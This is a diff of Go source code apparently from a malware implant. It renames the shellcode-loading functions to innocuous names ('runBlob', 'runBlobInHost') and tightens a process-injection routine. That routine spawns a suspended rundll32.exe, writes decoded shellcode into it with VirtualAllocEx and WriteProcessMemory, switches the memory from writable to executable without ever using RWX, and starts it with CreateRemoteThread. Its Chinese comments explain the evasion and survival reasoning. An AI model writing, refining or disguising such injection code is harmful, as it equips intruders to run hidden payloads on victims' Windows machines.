@@ -129,7 +129,7 @@ func loadDLL(data string) (string, int32, string) {
 	return fmt.Sprintf("DLL loaded at 0x%x, path: %s", hModule, tempPath), 0, ""
 }
 
-func loadShellcode(data string) (string, int32, string) {
+func runBlob(data string) (string, int32, string) {
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
 		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
@@ -141,12 +141,12 @@ func loadShellcode(data string) (string, int32, string) {
 	// 注入独立宿主进程（rundll32.exe）执行，绝不使用植入端进程：
 	// Go runtime 在 main 结束时调用 ExitProcess，若 shellcode 在植入端进程内
 	// 执行会把植入端一起杀掉导致掉线。独立宿主被杀则无任何影响。
-	return injectShellcodeHost(decoded)
+	return runBlobInHost(decoded)
 }
 
-// injectShellcodeHost 在独立宿主进程（System32\rundll32.exe）内执行 shellcode：
+// runBlobInHost 在独立宿主进程（System32\rundll32.exe）内执行 shellcode：
 // CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread。
-func injectShellcodeHost(shellcode []byte) (string, int32, string) {
+func runBlobInHost(shellcode []byte) (string, int32, string) {
 	host := filepath.Join(os.Getenv("SystemRoot"), "System32", "rundll32.exe")
 	if _, err := os.Stat(host); err != nil {
 		host = filepath.Join(os.Getenv("SystemRoot"), "System32", "cmd.exe")
@@ -160,11 +160,11 @@ func injectShellcodeHost(shellcode []byte) (string, int32, string) {
 	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
 
 	const (
-		CREATE_SUSPENDED = 0x00000004
-		CREATE_NO_WINDOW = 0x08000000
-		MEM_COMMIT       = 0x1000
-		MEM_RESERVE      = 0x2000
-		PAGE_READWRITE   = 0x04
+		CREATE_SUSPENDED  = 0x00000004
+		CREATE_NO_WINDOW  = 0x08000000
+		MEM_COMMIT        = 0x1000
+		MEM_RESERVE       = 0x2000
+		PAGE_READWRITE    = 0x04
 		PAGE_EXECUTE_READ = 0x20
 	)
 
@@ -204,11 +204,13 @@ func injectShellcodeHost(shellcode []byte) (string, int32, string) {
 		return "", -1, fmt.Sprintf("WriteProcessMemory failed (err=%d)", getLastError())
 	}
 
-	// 改为可执行
+	// 改为可执行（RW → RX 两步，绝不申请 RWX）
 	var oldProtect uint32
-	procVirtualProtectEx.Call(
+	if ret, _, _ = procVirtualProtectEx.Call(
 		uintptr(pi.Process), addr, uintptr(len(shellcode)),
-		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
+		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect))); ret == 0 {
+		return "", -1, fmt.Sprintf("VirtualProtectEx failed (err=%d)", getLastError())
+	}
 
 	// 在宿主进程中创建远程线程执行 shellcode
 	var threadID uint32
